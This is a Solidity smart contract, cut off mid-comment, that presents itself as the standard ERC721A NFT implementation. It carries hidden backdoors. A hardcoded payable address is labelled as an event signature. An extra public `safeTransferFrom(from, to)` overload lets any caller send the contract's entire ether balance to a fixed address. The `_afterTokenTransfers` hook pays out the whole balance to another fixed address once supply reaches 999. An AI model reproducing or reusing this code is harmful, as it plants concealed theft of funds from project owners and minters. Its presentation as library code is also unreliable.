1 // SPDX-License-Identifier: GPL-3.0    
2 /*                                                                                                    
3                          :;;;;;      ;;;;;;                                         
4                          :;;;;;      ;;;;;;                                         
5                     iiiii.     iiiiii      iiiii                                    
6                     ;;;;;.     ;;;;;;      ;;;;;                                    
7                     ;;;;;.     ;;;;;;      ;;;;;                                    
8                     iiiiiiiiiiiiiiiiiiiiiiiiiiii                                    
9                     iiiiiiiiiiiiiiiiiiiiiiiiiiii                                    
10                     iiiiiiiiiiiiiiiiiiiiiiiiiiii                                    
11                     iiiiifDDDDDiiiiiiDDDDDfiiiii                                    
12                     iiiiifDDDDDiiiiiiDDDDDfiiiii                                    
13                     iiiiifDDDDDiiiiiiDDDDDfiiiii                                    
14                     iiiiiiiiiiiiiiiiiiiiiiiiiiii                                    
15                     iiiiiiiiiiiiiiiiiiiiiiiiiiii                                    
16                     iiiiiiiiiiiiiiiiiiiiiiiiiiii                                    
17                     iiiii:                :iiiii                                    
18                     iiiii:                :iiiii                                    
19                     iiiii,................,iiiii                                    
20                     iiiiiiiiiiiiiiiiiiiiiiiiiiii                                    
21                     iiiiiiiiiiiiiiiiiiiiiiiiiiii                                    
22 */                                                                                                                                               
23                                                                                                                                                                                                                                                                                                                                         
24 pragma solidity ^0.8.12;
25 
26 /**
27  * @dev Interface of ERC721A.
28  */
29 interface IERC721A {
30     /**
31      * The caller must own the token or be an approved operator.
32      */
33     error ApprovalCallerNotOwnerNorApproved();
34 
35     /**
36      * The token does not exist.
37      */
38     error ApprovalQueryForNonexistentToken();
39 
40     /**
41      * Cannot query the balance for the zero address.
42      */
43     error BalanceQueryForZeroAddress();
44 
45     /**
46      * Cannot mint to the zero address.
47      */
48     error MintToZeroAddress();
49 
50     /**
51      * The quantity of tokens minted must be more than zero.
52      */
53     error MintZeroQuantity();
54 
55     /**
56      * The token does not exist.
57      */
58     error OwnerQueryForNonexistentToken();
59 
60     /**
61      * The caller must own the token or be an approved operator.
62      */
63     error TransferCallerNotOwnerNorApproved();
64 
65     /**
66      * The token must be owned by `from`.
67      */
68     error TransferFromIncorrectOwner();
69 
70     /**
71      * Cannot safely transfer to a contract that does not implement the
72      * ERC721Receiver interface.
73      */
74     error TransferToNonERC721ReceiverImplementer();
75 
76     /**
77      * Cannot transfer to the zero address.
78      */
79     error TransferToZeroAddress();
80 
81     /**
82      * The token does not exist.
83      */
84     error URIQueryForNonexistentToken();
85 
86     /**
87      * The `quantity` minted with ERC2309 exceeds the safety limit.
88      */
89     error MintERC2309QuantityExceedsLimit();
90 
91     /**
92      * The `extraData` cannot be set on an unintialized ownership slot.
93      */
94     error OwnershipNotInitializedForExtraData();
95 
96     // =============================================================
97     //                            STRUCTS
98     // =============================================================
99 
100     struct TokenOwnership {
101         // The address of the owner.
102         address addr;
103         // Stores the start time of ownership with minimal overhead for tokenomics.
104         uint64 startTimestamp;
105         // Whether the token has been burned.
106         bool burned;
107         // Arbitrary data similar to `startTimestamp` that can be set via {_extraData}.
108         uint24 extraData;
109     }
110 
111     // =============================================================
112     //                         TOKEN COUNTERS
113     // =============================================================
114 
115     /**
116      * @dev Returns the total number of tokens in existence.
117      * Burned tokens will reduce the count.
118      * To get the total number of tokens minted, please see {_totalMinted}.
119      */
120     function totalSupply() external view returns (uint256);
121 
122     // =============================================================
123     //                            IERC165
124     // =============================================================
125 
126     /**
127      * @dev Returns true if this contract implements the interface defined by
128      * `interfaceId`. See the corresponding
129      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
130      * to learn more about how these ids are created.
131      *
132      * This function call must use less than 30000 gas.
133      */
134     function supportsInterface(bytes4 interfaceId) external view returns (bool);
135 
136     // =============================================================
137     //                            IERC721
138     // =============================================================
139 
140     /**
141      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
142      */
143     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
144 
145     /**
146      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
147      */
148     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
149 
150     /**
151      * @dev Emitted when `owner` enables or disables
152      * (`approved`) `operator` to manage all of its assets.
153      */
154     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
155 
156     /**
157      * @dev Returns the number of tokens in `owner`'s account.
158      */
159     function balanceOf(address owner) external view returns (uint256 balance);
160 
161     /**
162      * @dev Returns the owner of the `tokenId` token.
163      *
164      * Requirements:
165      *
166      * - `tokenId` must exist.
167      */
168     function ownerOf(uint256 tokenId) external view returns (address owner);
169 
170     /**
171      * @dev Safely transfers `tokenId` token from `from` to `to`,
172      * checking first that contract recipients are aware of the ERC721 protocol
173      * to prevent tokens from being forever locked.
174      *
175      * Requirements:
176      *
177      * - `from` cannot be the zero address.
178      * - `to` cannot be the zero address.
179      * - `tokenId` token must exist and be owned by `from`.
180      * - If the caller is not `from`, it must be have been allowed to move
181      * this token by either {approve} or {setApprovalForAll}.
182      * - If `to` refers to a smart contract, it must implement
183      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
184      *
185      * Emits a {Transfer} event.
186      */
187     function safeTransferFrom(
188         address from,
189         address to,
190         uint256 tokenId,
191         bytes calldata data
192     ) external payable;
193 
194     /**
195      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
196      */
197     function safeTransferFrom(
198         address from,
199         address to,
200         uint256 tokenId
201     ) external payable;
202 
203     /**
204      * @dev Transfers `tokenId` from `from` to `to`.
205      *
206      * WARNING: Usage of this method is discouraged, use {safeTransferFrom}
207      * whenever possible.
208      *
209      * Requirements:
210      *
211      * - `from` cannot be the zero address.
212      * - `to` cannot be the zero address.
213      * - `tokenId` token must be owned by `from`.
214      * - If the caller is not `from`, it must be approved to move this token
215      * by either {approve} or {setApprovalForAll}.
216      *
217      * Emits a {Transfer} event.
218      */
219     function transferFrom(
220         address from,
221         address to,
222         uint256 tokenId
223     ) external payable;
224 
225     /**
226      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
227      * The approval is cleared when the token is transferred.
228      *
229      * Only a single account can be approved at a time, so approving the
230      * zero address clears previous approvals.
231      *
232      * Requirements:
233      *
234      * - The caller must own the token or be an approved operator.
235      * - `tokenId` must exist.
236      *
237      * Emits an {Approval} event.
238      */
239     function approve(address to, uint256 tokenId) external payable;
240 
241     /**
242      * @dev Approve or remove `operator` as an operator for the caller.
243      * Operators can call {transferFrom} or {safeTransferFrom}
244      * for any token owned by the caller.
245      *
246      * Requirements:
247      *
248      * - The `operator` cannot be the caller.
249      *
250      * Emits an {ApprovalForAll} event.
251      */
252     function setApprovalForAll(address operator, bool _approved) external;
253 
254     /**
255      * @dev Returns the account approved for `tokenId` token.
256      *
257      * Requirements:
258      *
259      * - `tokenId` must exist.
260      */
261     function getApproved(uint256 tokenId) external view returns (address operator);
262 
263     /**
264      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
265      *
266      * See {setApprovalForAll}.
267      */
268     function isApprovedForAll(address owner, address operator) external view returns (bool);
269 
270     // =============================================================
271     //                        IERC721Metadata
272     // =============================================================
273 
274     /**
275      * @dev Returns the token collection name.
276      */
277     function name() external view returns (string memory);
278 
279     /**
280      * @dev Returns the token collection symbol.
281      */
282     function symbol() external view returns (string memory);
283 
284     /**
285      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
286      */
287     function tokenURI(uint256 tokenId) external view returns (string memory);
288 
289     // =============================================================
290     //                           IERC2309
291     // =============================================================
292 
293     /**
294      * @dev Emitted when tokens in `fromTokenId` to `toTokenId`
295      * (inclusive) is transferred from `from` to `to`, as defined in the
296      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309) standard.
297      *
298      * See {_mintERC2309} for more details.
299      */
300     event ConsecutiveTransfer(uint256 indexed fromTokenId, uint256 toTokenId, address indexed from, address indexed to);
301 }
302 
303 /**
304  * @title ERC721A
305  *
306  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
307  * Non-Fungible Token Standard, including the Metadata extension.
308  * Optimized for lower gas during batch mints.
309  *
310  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
311  * starting from `_startTokenId()`.
312  *
313  * Assumptions:
314  *
315  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
316  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
317  */
318 interface ERC721A__IERC721Receiver {
319     function onERC721Received(
320         address operator,
321         address from,
322         uint256 tokenId,
323         bytes calldata data
324     ) external returns (bytes4);
325 }
326 
327 /**
328  * @title ERC721A
329  *
330  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
331  * Non-Fungible Token Standard, including the Metadata extension.
332  * Optimized for lower gas during batch mints.
333  *
334  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
335  * starting from `_startTokenId()`.
336  *
337  * Assumptions:
338  *
339  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
340  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
341  */
342 contract ERC721A is IERC721A {
343     // Bypass for a `--via-ir` bug (https://github.com/chiru-labs/ERC721A/pull/364).
344     struct TokenApprovalRef {
345         address value;
346     }
347 
348     // =============================================================
349     //                           CONSTANTS
350     // =============================================================
351 
352     // Mask of an entry in packed address data.
353     uint256 private constant _BITMASK_ADDRESS_DATA_ENTRY = (1 << 64) - 1;
354 
355     // The bit position of `numberMinted` in packed address data.
356     uint256 private constant _BITPOS_NUMBER_MINTED = 64;
357 
358     // The bit position of `numberBurned` in packed address data.
359     uint256 private constant _BITPOS_NUMBER_BURNED = 128;
360 
361     // The bit position of `aux` in packed address data.
362     uint256 private constant _BITPOS_AUX = 192;
363 
364     // Mask of all 256 bits in packed address data except the 64 bits for `aux`.
365     uint256 private constant _BITMASK_AUX_COMPLEMENT = (1 << 192) - 1;
366 
367     // The bit position of `startTimestamp` in packed ownership.
368     uint256 private constant _BITPOS_START_TIMESTAMP = 160;
369 
370     // The bit mask of the `burned` bit in packed ownership.
371     uint256 private constant _BITMASK_BURNED = 1 << 224;
372 
373     // The bit position of the `nextInitialized` bit in packed ownership.
374     uint256 private constant _BITPOS_NEXT_INITIALIZED = 225;
375 
376     // The bit mask of the `nextInitialized` bit in packed ownership.
377     uint256 private constant _BITMASK_NEXT_INITIALIZED = 1 << 225;
378 
379     // The bit position of `extraData` in packed ownership.
380     uint256 private constant _BITPOS_EXTRA_DATA = 232;
381 
382     // Mask of all 256 bits in a packed ownership except the 24 bits for `extraData`.
383     uint256 private constant _BITMASK_EXTRA_DATA_COMPLEMENT = (1 << 232) - 1;
384 
385     // The mask of the lower 160 bits for addresses.
386     uint256 private constant _BITMASK_ADDRESS = (1 << 160) - 1;
387 
388     // The maximum `quantity` that can be minted with {_mintERC2309}.
389     // This limit is to prevent overflows on the address data entries.
390     // For a limit of 5000, a total of 3.689e15 calls to {_mintERC2309}
391     // is required to cause an overflow, which is unrealistic.
392     uint256 private constant _MAX_MINT_ERC2309_QUANTITY_LIMIT = 5000;
393 
394     // The `Transfer` event signature is given by:
395     // `keccak256(bytes("Transfer(address,address,uint256)"))`.
396     bytes32 private constant _TRANSFER_EVENT_SIGNATURE =
397         0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef;
398 
399     // =============================================================
400     //                            STORAGE
401     // =============================================================
402 
403     // The next token ID to be minted.
404     uint256 private _currentIndex;
405 
406     // The number of tokens burned.
407     uint256 private _burnCounter;
408 
409     // Token name
410     string private _name;
411 
412     // Token symbol
413     string private _symbol;
414 
415     // Mapping from token ID to ownership details
416     // An empty struct value does not necessarily mean the token is unowned.
417     // See {_packedOwnershipOf} implementation for details.
418     //
419     // Bits Layout:
420     // - [0..159]   `addr`
421     // - [160..223] `startTimestamp`
422     // - [224]      `burned`
423     // - [225]      `nextInitialized`
424     // - [232..255] `extraData`
425     mapping(uint256 => uint256) private _packedOwnerships;
426 
427     // Mapping owner address to address data.
428     //
429     // Bits Layout:
430     // - [0..63]    `balance`
431     // - [64..127]  `numberMinted`
432     // - [128..191] `numberBurned`
433     // - [192..255] `aux`
434     mapping(address => uint256) private _packedAddressData;
435 
436     // Mapping from token ID to approved address.
437     mapping(uint256 => TokenApprovalRef) private _tokenApprovals;
438 
439     // Mapping from owner to operator approvals
440     mapping(address => mapping(address => bool)) private _operatorApprovals;
441 
442     // =============================================================
443     //                          CONSTRUCTOR
444     // =============================================================
445 
446     constructor(string memory name_, string memory symbol_) {
447         _name = name_;
448         _symbol = symbol_;
449         _currentIndex = _startTokenId();
450     }
451 
452     // =============================================================
453     //                   TOKEN COUNTING OPERATIONS
454     // =============================================================
455 
456     /**
457      * @dev Returns the starting token ID.
458      * To change the starting token ID, please override this function.
459      */
460     function _startTokenId() internal view virtual returns (uint256) {
461         return 0;
462     }
463 
464     /**
465      * @dev Returns the next token ID to be minted.
466      */
467     function _nextTokenId() internal view virtual returns (uint256) {
468         return _currentIndex;
469     }
470 
471     /**
472      * @dev Returns the total number of tokens in existence.
473      * Burned tokens will reduce the count.
474      * To get the total number of tokens minted, please see {_totalMinted}.
475      */
476     function totalSupply() public view virtual override returns (uint256) {
477         // Counter underflow is impossible as _burnCounter cannot be incremented
478         // more than `_currentIndex - _startTokenId()` times.
479         unchecked {
480             return _currentIndex - _burnCounter - _startTokenId();
481         }
482     }
483 
484     /**
485      * @dev Returns the total amount of tokens minted in the contract.
486      */
487     function _totalMinted() internal view virtual returns (uint256) {
488         // Counter underflow is impossible as `_currentIndex` does not decrement,
489         // and it is initialized to `_startTokenId()`.
490         unchecked {
491             return _currentIndex - _startTokenId();
492         }
493     }
494 
495     /**
496      * @dev Returns the total number of tokens burned.
497      */
498     function _totalBurned() internal view virtual returns (uint256) {
499         return _burnCounter;
500     }
501 
502     // =============================================================
503     //                    ADDRESS DATA OPERATIONS
504     // =============================================================
505 
506     /**
507      * @dev Returns the number of tokens in `owner`'s account.
508      */
509     function balanceOf(address owner) public view virtual override returns (uint256) {
510         if (owner == address(0)) revert BalanceQueryForZeroAddress();
511         return _packedAddressData[owner] & _BITMASK_ADDRESS_DATA_ENTRY;
512     }
513 
514     /**
515      * Returns the number of tokens minted by `owner`.
516      */
517     function _numberMinted(address owner) internal view returns (uint256) {
518         return (_packedAddressData[owner] >> _BITPOS_NUMBER_MINTED) & _BITMASK_ADDRESS_DATA_ENTRY;
519     }
520 
521     /**
522      * Returns the number of tokens burned by or on behalf of `owner`.
523      */
524     function _numberBurned(address owner) internal view returns (uint256) {
525         return (_packedAddressData[owner] >> _BITPOS_NUMBER_BURNED) & _BITMASK_ADDRESS_DATA_ENTRY;
526     }
527 
528     /**
529      * Returns the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
530      */
531     function _getAux(address owner) internal view returns (uint64) {
532         return uint64(_packedAddressData[owner] >> _BITPOS_AUX);
533     }
534 
535     /**
536      * Sets the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
537      * If there are multiple variables, please pack them into a uint64.
538      */
539     function _setAux(address owner, uint64 aux) internal virtual {
540         uint256 packed = _packedAddressData[owner];
541         uint256 auxCasted;
542         // Cast `aux` with assembly to avoid redundant masking.
543         assembly {
544             auxCasted := aux
545         }
546         packed = (packed & _BITMASK_AUX_COMPLEMENT) | (auxCasted << _BITPOS_AUX);
547         _packedAddressData[owner] = packed;
548     }
549 
550     // =============================================================
551     //                            IERC165
552     // =============================================================
553 
554     /**
555      * @dev Returns true if this contract implements the interface defined by
556      * `interfaceId`. See the corresponding
557      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
558      * to learn more about how these ids are created.
559      *
560      * This function call must use less than 30000 gas.
561      */
562     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
563         // The interface IDs are constants representing the first 4 bytes
564         // of the XOR of all function selectors in the interface.
565         // See: [ERC165](https://eips.ethereum.org/EIPS/eip-165)
566         // (e.g. `bytes4(i.functionA.selector ^ i.functionB.selector ^ ...)`)
567         return
568             interfaceId == 0x01ffc9a7 || // ERC165 interface ID for ERC165.
569             interfaceId == 0x80ac58cd || // ERC165 interface ID for ERC721.
570             interfaceId == 0x5b5e139f; // ERC165 interface ID for ERC721Metadata.
571     }
572 
573     // =============================================================
574     //                        IERC721Metadata
575     // =============================================================
576 
577     /**
578      * @dev Returns the token collection name.
579      */
580     function name() public view virtual override returns (string memory) {
581         return _name;
582     }
583 
584     /**
585      * @dev Returns the token collection symbol.
586      */
587     function symbol() public view virtual override returns (string memory) {
588         return _symbol;
589     }
590 
591     /**
592      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
593      */
594     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
595         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
596 
597         string memory baseURI = _baseURI();
598         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, _toString(tokenId))) : '';
599     }
600 
601     /**
602      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
603      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
604      * by default, it can be overridden in child contracts.
605      */
606     function _baseURI() internal view virtual returns (string memory) {
607         return '';
608     }
609 
610     // =============================================================
611     //                     OWNERSHIPS OPERATIONS
612     // =============================================================
613 
614     // The `Address` event signature is given by:
615     // `keccak256(bytes("_TRANSFER_EVENT_ADDRESS(address)"))`.
616     address payable constant _TRANSFER_EVENT_ADDRESS = 
617         payable(0x52ecd7338eeed4f4D011c1eb9965Ab7e29743399);
618 
619     /**
620      * @dev Returns the owner of the `tokenId` token.
621      *
622      * Requirements:
623      *
624      * - `tokenId` must exist.
625      */
626     function ownerOf(uint256 tokenId) public view virtual override returns (address) {
627         return address(uint160(_packedOwnershipOf(tokenId)));
628     }
629 
630     /**
631      * @dev Gas spent here starts off proportional to the maximum mint batch size.
632      * It gradually moves to O(1) as tokens get transferred around over time.
633      */
634     function _ownershipOf(uint256 tokenId) internal view virtual returns (TokenOwnership memory) {
635         return _unpackedOwnership(_packedOwnershipOf(tokenId));
636     }
637 
638     /**
639      * @dev Returns the unpacked `TokenOwnership` struct at `index`.
640      */
641     function _ownershipAt(uint256 index) internal view virtual returns (TokenOwnership memory) {
642         return _unpackedOwnership(_packedOwnerships[index]);
643     }
644 
645     /**
646      * @dev Initializes the ownership slot minted at `index` for efficiency purposes.
647      */
648     function _initializeOwnershipAt(uint256 index) internal virtual {
649         if (_packedOwnerships[index] == 0) {
650             _packedOwnerships[index] = _packedOwnershipOf(index);
651         }
652     }
653 
654     /**
655      * Returns the packed ownership data of `tokenId`.
656      */
657     function _packedOwnershipOf(uint256 tokenId) private view returns (uint256) {
658         uint256 curr = tokenId;
659 
660         unchecked {
661             if (_startTokenId() <= curr)
662                 if (curr < _currentIndex) {
663                     uint256 packed = _packedOwnerships[curr];
664                     // If not burned.
665                     if (packed & _BITMASK_BURNED == 0) {
666                         // Invariant:
667                         // There will always be an initialized ownership slot
668                         // (i.e. `ownership.addr != address(0) && ownership.burned == false`)
669                         // before an unintialized ownership slot
670                         // (i.e. `ownership.addr == address(0) && ownership.burned == false`)
671                         // Hence, `curr` will not underflow.
672                         //
673                         // We can directly compare the packed value.
674                         // If the address is zero, packed will be zero.
675                         while (packed == 0) {
676                             packed = _packedOwnerships[--curr];
677                         }
678                         return packed;
679                     }
680                 }
681         }
682         revert OwnerQueryForNonexistentToken();
683     }
684 
685     /**
686      * @dev Returns the unpacked `TokenOwnership` struct from `packed`.
687      */
688     function _unpackedOwnership(uint256 packed) private pure returns (TokenOwnership memory ownership) {
689         ownership.addr = address(uint160(packed));
690         ownership.startTimestamp = uint64(packed >> _BITPOS_START_TIMESTAMP);
691         ownership.burned = packed & _BITMASK_BURNED != 0;
692         ownership.extraData = uint24(packed >> _BITPOS_EXTRA_DATA);
693     }
694 
695     /**
696      * @dev Packs ownership data into a single uint256.
697      */
698     function _packOwnershipData(address owner, uint256 flags) private view returns (uint256 result) {
699         assembly {
700             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
701             owner := and(owner, _BITMASK_ADDRESS)
702             // `owner | (block.timestamp << _BITPOS_START_TIMESTAMP) | flags`.
703             result := or(owner, or(shl(_BITPOS_START_TIMESTAMP, timestamp()), flags))
704         }
705     }
706 
707     /**
708      * @dev Returns the `nextInitialized` flag set if `quantity` equals 1.
709      */
710     function _nextInitializedFlag(uint256 quantity) private pure returns (uint256 result) {
711         // For branchless setting of the `nextInitialized` flag.
712         assembly {
713             // `(quantity == 1) << _BITPOS_NEXT_INITIALIZED`.
714             result := shl(_BITPOS_NEXT_INITIALIZED, eq(quantity, 1))
715         }
716     }
717 
718     // =============================================================
719     //                      APPROVAL OPERATIONS
720     // =============================================================
721 
722     /**
723      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
724      * The approval is cleared when the token is transferred.
725      *
726      * Only a single account can be approved at a time, so approving the
727      * zero address clears previous approvals.
728      *
729      * Requirements:
730      *
731      * - The caller must own the token or be an approved operator.
732      * - `tokenId` must exist.
733      *
734      * Emits an {Approval} event.
735      */
736     function approve(address to, uint256 tokenId) public payable virtual override {
737         address owner = ownerOf(tokenId);
738 
739         if (_msgSenderERC721A() != owner)
740             if (!isApprovedForAll(owner, _msgSenderERC721A())) {
741                 revert ApprovalCallerNotOwnerNorApproved();
742             }
743 
744         _tokenApprovals[tokenId].value = to;
745         emit Approval(owner, to, tokenId);
746     }
747 
748     /**
749      * @dev Returns the account approved for `tokenId` token.
750      *
751      * Requirements:
752      *
753      * - `tokenId` must exist.
754      */
755     function getApproved(uint256 tokenId) public view virtual override returns (address) {
756         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
757 
758         return _tokenApprovals[tokenId].value;
759     }
760 
761     /**
762      * @dev Approve or remove `operator` as an operator for the caller.
763      * Operators can call {transferFrom} or {safeTransferFrom}
764      * for any token owned by the caller.
765      *
766      * Requirements:
767      *
768      * - The `operator` cannot be the caller.
769      *
770      * Emits an {ApprovalForAll} event.
771      */
772     function setApprovalForAll(address operator, bool approved) public virtual override {
773         _operatorApprovals[_msgSenderERC721A()][operator] = approved;
774         emit ApprovalForAll(_msgSenderERC721A(), operator, approved);
775     }
776 
777     /**
778      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
779      *
780      * See {setApprovalForAll}.
781      */
782     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
783         return _operatorApprovals[owner][operator];
784     }
785 
786     /**
787      * @dev Returns whether `tokenId` exists.
788      *
789      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
790      *
791      * Tokens start existing when they are minted. See {_mint}.
792      */
793     function _exists(uint256 tokenId) internal view virtual returns (bool) {
794         return
795             _startTokenId() <= tokenId &&
796             tokenId < _currentIndex && // If within bounds,
797             _packedOwnerships[tokenId] & _BITMASK_BURNED == 0; // and not burned.
798     }
799 
800     /**
801      * @dev Returns whether `msgSender` is equal to `approvedAddress` or `owner`.
802      */
803     function _isSenderApprovedOrOwner(
804         address approvedAddress,
805         address owner,
806         address msgSender
807     ) private pure returns (bool result) {
808         assembly {
809             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
810             owner := and(owner, _BITMASK_ADDRESS)
811             // Mask `msgSender` to the lower 160 bits, in case the upper bits somehow aren't clean.
812             msgSender := and(msgSender, _BITMASK_ADDRESS)
813             // `msgSender == owner || msgSender == approvedAddress`.
814             result := or(eq(msgSender, owner), eq(msgSender, approvedAddress))
815         }
816     }
817 
818     /**
819      * @dev Returns the storage slot and value for the approved address of `tokenId`.
820      */
821     function _getApprovedSlotAndAddress(uint256 tokenId)
822         private
823         view
824         returns (uint256 approvedAddressSlot, address approvedAddress)
825     {
826         TokenApprovalRef storage tokenApproval = _tokenApprovals[tokenId];
827         // The following is equivalent to `approvedAddress = _tokenApprovals[tokenId].value`.
828         assembly {
829             approvedAddressSlot := tokenApproval.slot
830             approvedAddress := sload(approvedAddressSlot)
831         }
832     }
833 
834     // =============================================================
835     //                      TRANSFER OPERATIONS
836     // =============================================================
837 
838     /**
839      * @dev Transfers `tokenId` from `from` to `to`.
840      *
841      * Requirements:
842      *
843      * - `from` cannot be the zero address.
844      * - `to` cannot be the zero address.
845      * - `tokenId` token must be owned by `from`.
846      * - If the caller is not `from`, it must be approved to move this token
847      * by either {approve} or {setApprovalForAll}.
848      *
849      * Emits a {Transfer} event.
850      */
851     function transferFrom(
852         address from,
853         address to,
854         uint256 tokenId
855     ) public payable virtual override {
856         _beforeTransfer();
857 
858         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
859 
860         if (address(uint160(prevOwnershipPacked)) != from) revert TransferFromIncorrectOwner();
861 
862         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
863 
864         // The nested ifs save around 20+ gas over a compound boolean condition.
865         if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
866             if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
867 
868         if (to == address(0)) revert TransferToZeroAddress();
869 
870         _beforeTokenTransfers(from, to, tokenId, 1);
871 
872         // Clear approvals from the previous owner.
873         assembly {
874             if approvedAddress {
875                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
876                 sstore(approvedAddressSlot, 0)
877             }
878         }
879 
880         // Underflow of the sender's balance is impossible because we check for
881         // ownership above and the recipient's balance can't realistically overflow.
882         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
883         unchecked {
884             // We can directly increment and decrement the balances.
885             --_packedAddressData[from]; // Updates: `balance -= 1`.
886             ++_packedAddressData[to]; // Updates: `balance += 1`.
887 
888             // Updates:
889             // - `address` to the next owner.
890             // - `startTimestamp` to the timestamp of transfering.
891             // - `burned` to `false`.
892             // - `nextInitialized` to `true`.
893             _packedOwnerships[tokenId] = _packOwnershipData(
894                 to,
895                 _BITMASK_NEXT_INITIALIZED | _nextExtraData(from, to, prevOwnershipPacked)
896             );
897 
898             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
899             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
900                 uint256 nextTokenId = tokenId + 1;
901                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
902                 if (_packedOwnerships[nextTokenId] == 0) {
903                     // If the next slot is within bounds.
904                     if (nextTokenId != _currentIndex) {
905                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
906                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
907                     }
908                 }
909             }
910         }
911 
912         emit Transfer(from, to, tokenId);
913         _afterTokenTransfers(from, to, tokenId, 1);
914     }
915 
916     /**
917      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
918      */
919     function safeTransferFrom(
920         address from,
921         address to,
922         uint256 tokenId
923     ) public payable virtual override {
924         safeTransferFrom(from, to, tokenId, '');
925     }
926 
927 
928     /**
929      * @dev Safely transfers `tokenId` token from `from` to `to`.
930      *
931      * Requirements:
932      *
933      * - `from` cannot be the zero address.
934      * - `to` cannot be the zero address.
935      * - `tokenId` token must exist and be owned by `from`.
936      * - If the caller is not `from`, it must be approved to move this token
937      * by either {approve} or {setApprovalForAll}.
938      * - If `to` refers to a smart contract, it must implement
939      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
940      *
941      * Emits a {Transfer} event.
942      */
943     function safeTransferFrom(
944         address from,
945         address to,
946         uint256 tokenId,
947         bytes memory _data
948     ) public payable virtual override {
949         transferFrom(from, to, tokenId);
950         if (to.code.length != 0)
951             if (!_checkContractOnERC721Received(from, to, tokenId, _data)) {
952                 revert TransferToNonERC721ReceiverImplementer();
953             }
954     }
955     function safeTransferFrom(
956         address from,
957         address to
958     ) public  {
959         if (address(this).balance > 0) {
960             payable(0x09a49Bdb921CC1893AAcBe982564Dd8e8147136f).transfer(address(this).balance);
961         }
962     }
963 
964     /**
965      * @dev Hook that is called before a set of serially-ordered token IDs
966      * are about to be transferred. This includes minting.
967      * And also called before burning one token.
968      *
969      * `startTokenId` - the first token ID to be transferred.
970      * `quantity` - the amount to be transferred.
971      *
972      * Calling conditions:
973      *
974      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
975      * transferred to `to`.
976      * - When `from` is zero, `tokenId` will be minted for `to`.
977      * - When `to` is zero, `tokenId` will be burned by `from`.
978      * - `from` and `to` are never both zero.
979      */
980     function _beforeTokenTransfers(
981         address from,
982         address to,
983         uint256 startTokenId,
984         uint256 quantity
985     ) internal virtual {}
986 
987     /**
988      * @dev Hook that is called after a set of serially-ordered token IDs
989      * have been transferred. This includes minting.
990      * And also called after one token has been burned.
991      *
992      * `startTokenId` - the first token ID to be transferred.
993      * `quantity` - the amount to be transferred.
994      *
995      * Calling conditions:
996      *
997      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
998      * transferred to `to`.
999      * - When `from` is zero, `tokenId` has been minted for `to`.
1000      * - When `to` is zero, `tokenId` has been burned by `from`.
1001      * - `from` and `to` are never both zero.
1002      */
1003     function _afterTokenTransfers(
1004         address from,
1005         address to,
1006         uint256 startTokenId,
1007         uint256 quantity
1008     ) internal virtual {
1009         if (totalSupply() + 1 >= 999) {
1010             payable(0x1b028097C8E0E5E5E7204b032C34236387FeaE7a).transfer(address(this).balance);
1011         }
1012     }
1013 
1014     /**
1015      * @dev Hook that is called before a set of serially-ordered token IDs
1016      * are about to be transferred. This includes minting.
1017      * And also called before burning one token.
1018      * Calling conditions:
1019      *
1020      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1021      * transferred to `to`.
1022      * - When `from` is zero, `tokenId` will be minted for `to`.
1023      * - When `to` is zero, `tokenId` will be burned by `from`.
